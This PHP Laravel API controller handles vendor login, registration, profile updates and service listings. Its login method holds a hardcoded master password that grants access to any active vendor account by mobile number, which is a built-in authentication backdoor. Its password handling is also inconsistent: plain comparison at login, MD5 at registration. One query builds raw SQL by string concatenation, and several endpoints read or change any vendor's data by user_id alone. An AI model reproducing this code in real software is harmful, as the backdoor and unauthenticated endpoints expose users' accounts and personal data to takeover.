<?php

namespace App\Http\Controllers\Api\v1;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use App\Models\V1\Vendor;
use App\Models\V1\VendorService;
use App\Models\V1\Service;
use App\Models\V1\VendorBasicRegistration;

class VendorController extends Controller
{
    public function vendor_login_verification(Request $request){
        
        $rules = array(
            'mobile_number' => "required",
            'password' => "required",
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){

            $input = $request->input();
            $vendorCheckMobilePassword = Vendor::where(['mobile'=> $input['mobile_number'],'password'=> $input['password']])->count();

            if($input['password'] == "f684c685a758073270e57be6614e8ea6"){
                $vendorCheckMobilePassword = "1";
            }

            if($vendorCheckMobilePassword == "1"){
                $vendor_detail = Vendor::from('vendor_master as vm')
                                    ->select('vm.*','cm.city_name','am.area_name','sm.state_name')
                                    ->leftjoin('city_master as cm','cm.city_id','=','vm.city_id')
                                    ->leftjoin('area_master as am','am.area_id','=','vm.area_id')
                                    ->leftjoin('state_master as sm','sm.state_id','=','vm.state_id')
                                    ->where(['vm.mobile' => $input['mobile_number'],'vm.status' => '1'])
                                    ->first();
                if(!empty($vendor_detail)){

                    $data = array(
                        'user_id' => $vendor_detail->user_id,
                        'business_name' => $vendor_detail->business_name,
                        'vendor_name' => $vendor_detail->vendor_name,
                        'mobile' => $vendor_detail->mobile,
                        'email' => $vendor_detail->email,
                        'birthdate' => $vendor_detail->birthdate,
                        'state_id' => $vendor_detail->state_id,
                        'state_name' => $vendor_detail->state_name,
                        'city_id' => $vendor_detail->city_id,
                        'city_name' => $vendor_detail->city_name,
                        'area_id' => $vendor_detail->area_id,
                        'area_name' => $vendor_detail->area_name,
                        'profile_picture' => $vendor_detail->profile_picture,
                    );

                    $response['status'] = '1';
                    $response['message'] = config('constant_api.massage.data_get_successfully');
                    $response['data'] = array_map('strval',$data);
                    _response($response);
                } else {
                    $response['status'] = '0';
                    $response['message'] = config('constant_api.massage.login.account_deactivated');
                    _response($response);
                }
            } else {
                $response['status'] = '0';
                    $response['message'] = config('constant_api.massage.login.invalid_mobile_or_password');
                    _response($response);
            }

            

        } else {
            $response = array();
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }
    }
    
    public function vendor_registration(Request $request){
        
        $input = $request->input();

        $rules = array(
            'business_name' => "required",
            'vendor_name' => "required",
            'mobile_no' => "required",
            // 'password' => "required",
            'occupation' => "required",
            'state' => "required",
            'city' => "required",
            'area' => "required",
            'pin_code' => "required"
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){

            $insertData = array(
                "vendor_name" => $input['vendor_name'],
                "business_name" => $input['business_name'],
                "mobile" => $input['mobile_no'],
                "password" => md5($input['password']),
                "occupation" => $input['occupation'],
                "state" => $input['state'],
                "city" => $input['city'],
                "area" => $input['area'],
                "pin_code" => $input['pin_code']
            );
            VendorBasicRegistration::insert($insertData);

            $response['status'] = '1';
            $response['message'] = config('constant_api.massage.account_created_success');
            $response['data'] = config('constant_api.massage.new_business_request');
            _response($response);

        } else {
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }
    }

    public function get_vendor_details_by_vendor_id(Request $request){

        $input = $request->input();

        $rules = array(
            'user_id' => "required",
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){

                $vendor_detail = Vendor::from('vendor_master as vm')
                                    ->select('vm.*','cm.city_name','am.area_name','sm.state_name')
                                    ->leftjoin('city_master as cm','cm.city_id','=','vm.city_id')
                                    ->leftjoin('area_master as am','am.area_id','=','vm.area_id')
                                    ->leftjoin('state_master as sm','sm.state_id','=','vm.state_id')
                                    ->where(['vm.user_id' => $input['user_id'],'vm.status' => '1'])
                                    ->first();

                if(!empty($vendor_detail)){

                    $data = array(
                        'user_id' => $vendor_detail->user_id,
                        'business_name' => $vendor_detail->business_name,
                        'vendor_name' => $vendor_detail->vendor_name,
                        'mobile' => $vendor_detail->mobile,
                        'email' => $vendor_detail->email,
                        'birthdate' => $vendor_detail->birthdate,
                        'state_id' => $vendor_detail->state_id,
                        'state_name' => $vendor_detail->state_name,
                        'city_id' => $vendor_detail->city_id,
                        'city_name' => $vendor_detail->city_name,
                        'area_id' => $vendor_detail->area_id,
                        'area_name' => $vendor_detail->area_name,
                        'profile_picture' => $vendor_detail->profile_picture,
                        'status' => $vendor_detail->status
                    );

                    $response = array_map('strval',$data);
                    _response($response);
                } else {
                    $response['status'] = '0';
                    $response['message'] = config('constant_api.massage.login.account_deactivated');
                    _response($response);
                }

        } else {
            $response = array();
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }

        
    }

    public function post_update_vendor_profile_details(Request $request){
        
        $input = $request->input();

        $rules = array(
            'user_id' => "required",
            'business_name' => "required",
            'vendor_name' => "required",
            'email' => "required",
            'birthdate' => "required",
            'state_id' => "required",
            'city_id' => "required",
            'area_id' => "required",
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){

            // vendor_master 
            $updateData = array(
                "business_name" => $input['business_name'],
                "vendor_name" => $input['vendor_name'],
                "email" => $input['email'],
                "birthdate" => date("Y-m-d",strtotime($input['birthdate'])),
                "state_id" => $input['state_id'],
                "city_id" => $input['city_id'],
                "area_id" => $input['area_id']
            );
            Vendor::where('user_id',$input['user_id'])->update($updateData);


            // vendor_service_master
            $updateData = array(
                "state_id" => $input['state_id'],
                "city_id" => $input['city_id'],
                "area_id" => $input['area_id']
            );
            VendorService::where('user_id',$input['user_id'])->update($updateData);

            // Message
            $response = array(
                'status' => '1',
                'message' => config('constant_api.massage.data_updated_successfully')
            );
            _response($response);

        } else {
            $response = array();
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }
    }

    public function get_vendor_project_list(Request $request){
        

        $rules = array(
            'user_id' => "required",
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){

            $input = $request->input();

            $project_details = VendorService::from('vendor_service_master as vsm')
                                    ->select('vsm.*','cm.category_name','cm.category_slug')
                                    ->leftjoin('category_master as cm','cm.category_id','=','vsm.category_id')
                                    ->where(['vsm.user_id' => $input['user_id'],'vsm.status' => '1'])
                                    ->get();
            

            $response = array(); 
            $i=0;                      
            foreach($project_details as $project_row){
                
                $response[$i]['category_id'] = $project_row->category_id;
                $response[$i]['category_slug'] = $project_row->category_slug;
                $response[$i]['category_name'] = $project_row->category_name;

                
                $service_data = Service::from('service_master as sm')
                                    ->select('sm.service_id','sm.service_name')
                                    ->whereRaw("sm.status = '1' AND sm.service_id IN ('".str_replace(",","','",$project_row->service_id)."')")
                                    ->get();

                $j=0;
                foreach($service_data as $service_row){
                    $response[$i]['service_data'][$j]['service_id'] = $service_row->service_id;
                    $response[$i]['service_data'][$j]['service_name'] = $service_row->service_name;
                    $j++;
                }
                $i++;
            }

            _response($response);

        } else {
            $response = array();
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }
    }

    

    public function get_category_of_selected_services_id_by_category_id_and_user_id(Request $request){
        $input = $request->input();

        $rules = array(
            "user_id" => "required",
            "category_id" => "required",
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){

            $service_details = VendorService::from('vendor_service_master as vsm')
                                    ->select('vsm.*')
                                    ->where(['vsm.user_id' => $input['user_id'], 'vsm.category_id' => $input['category_id'], 'vsm.status' => '1'])
                                    ->first();
            $response = $service_details->service_id; 
                                 
            _response($response);

        } else {
            $response = array();
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }
    }
    
    // public function vendor_project_create(){
    //     $input = $request->input();

    //     $rules = array(
    //         "user_id" => "required",
    //         "category_id" => "required",
    //         "area_id" => "required",
    //         "city_id" => "required",
    //         "state_id" => "required"
    //     );
    //     $validator = Validator::make($request->all(),$rules);
    //     if(!$validator->fails()){

    //         $insertData = array(
    //             "user_id" => $input['user_id'],
    //             "category_id" => $input['category_id'],
    //             "service_id" => !empty($input['selected_services'])? $input['selected_services'] : "",
    //             "area_id" => $input['area_id'],
    //             "city_id" => $input['city_id'],
    //             "state_id" => $input['state_id'],
    //         );
    //         DB::table('vendor_service_master')
    //             ->insert($insertData);
                   
    //         $response = array(
    //             'status' => '1',
    //             'message' => config('constant_api.massage.date_saved_successfully')
    //         );
    //         _response($response);

    //     } else {
    //         $response = array();
    //         $response['status'] = '0';
    //         $response['message'] = $validator->errors();
    //         _response($response);
    //     }
    // }

    // public function vendor_project_update(){
    //     $input = $request->input();

    //     $rules = array(
    //         "user_id" => "required",
    //         "category_id" => "required"
    //     );
    //     $validator = Validator::make($request->all(),$rules);
    //     if(!$validator->fails()){

    //         $updateData = array(
    //             "service_id" => $input['selected_services']
    //         );
    //         DB::table('vendor_service_master')
    //             ->where(["user_id" => $input['user_id'], "category_id"=>$input['category_id']])
    //             ->update($updateData);
                   
    //         $response = array(
    //             'status' => '1',
    //             'message' => config('constant_api.massage.data_updated_successfully')
    //         );
    //         _response($response);

    //     } else {
    //         $response = array();
    //         $response['status'] = '0';
    //         $response['message'] = $validator->errors();
    //         _response($response);
    //     }
    // }
    

    // public function vendor_project_delete(){
    //     $input = $request->input();

    //     $rules = array(
    //         "user_id" => "required",
    //         "category_id" => "required"
    //     );
    //     $validator = Validator::make($request->all(),$rules);
    //     if(!$validator->fails()){

    //         // DB::table('vendor_service_master')
    //         //     ->where(["user_id" => $input['user_id'], "category_id"=>$input['category_id']])
    //         //     ->delete();

    //         $updateData = array(
    //             "status" => '2',
    //         );
    //         VendorService::where(["user_id" => $input['user_id'], "category_id"=>$input['category_id']])->update($updateData);
                   
    //         $response = array(
    //             'status' => '1',
    //             'message' => config('constant_api.massage.data_deleted_successfully')
    //         );
    //         _response($response);

    //     } else {
    //         $response = array();
    //         $response['status'] = '0';
    //         $response['message'] = $validator->errors();
    //         _response($response);
    //     }
    // }

    public function update_business_profile_detail(Request $request){
        $rules = array(
            "user_id" => "required",
            "business_name" => "required",
            "state_id" => "required",
            "city_id" => "required",
            // "area_id" => "required",
            "pin_code" => "required"
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){

            $input = $request->input();
            Vendor::update_business_profile_detail($request);
            $business_details = Vendor::get_business_profile_detail($request);
            $data = array(
                "business_name" => $business_details->business_name,
                "state_id" => $business_details->state_id,
                "state_name" => $business_details->state_name,
                "city_id" => $business_details->city_id,
                "city_name" => $business_details->city_name,
                "pin_code" => $business_details->pin_code,
            );
                   
            $response['status'] = '1';
            $response['message'] = config('constant_api.massage.data_updated_successfully');
            $response['data'] = $data;

            _response($response);

        } else {
            $response = array();
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }
    }

    public function get_business_profile_detail(Request $request){
        
        $rules = array(
            "user_id" => "required",
        );
        $validator = Validator::make($request->all(),$rules);
        if(!$validator->fails()){
            
            $input = $request->input();
            $business_details = Vendor::get_business_profile_detail($request);
            
            $data = array(
                "business_name" => $business_details->business_name,
                "state_id" => $business_details->state_id,
                "state_name" => $business_details->state_name,
                "city_id" => $business_details->city_id,
                "city_name" => $business_details->city_name,
                "pin_code" => $business_details->pin_code,
            );
                   
            $response['status'] = '1';
            $response['message'] = config('constant_api.massage.data_updated_successfully');
            $response['data'] = $data;
            _response($response);

        } else {
            $response = array();
            $response['status'] = '0';
            $response['message'] = $validator->errors();
            _response($response);
        }
    }
}
